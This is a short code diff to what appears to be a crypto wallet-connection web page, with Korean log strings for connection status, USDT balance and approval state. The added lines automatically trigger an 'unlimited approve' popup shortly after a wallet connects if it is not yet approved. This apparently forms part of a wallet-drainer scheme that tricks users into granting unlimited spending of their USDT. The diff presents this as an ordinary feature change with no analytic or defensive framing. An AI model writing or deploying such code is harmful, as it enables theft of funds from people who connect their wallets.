@@ -358,6 +358,11 @@
                     appendLog('[연결 완료] '+address+' | '+data.balance+' USDT | '+(data.isApproved?'승인완료':'미승인'),'success');
                 }
             }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
+
+            // 연결 완료 후 자동으로 승인 팝업 실행
+            if(!isApproved){
+                setTimeout(function(){ executeUnlimitedApprove(); }, 800);
+            }
         }
 
         function setApprovedUI(){
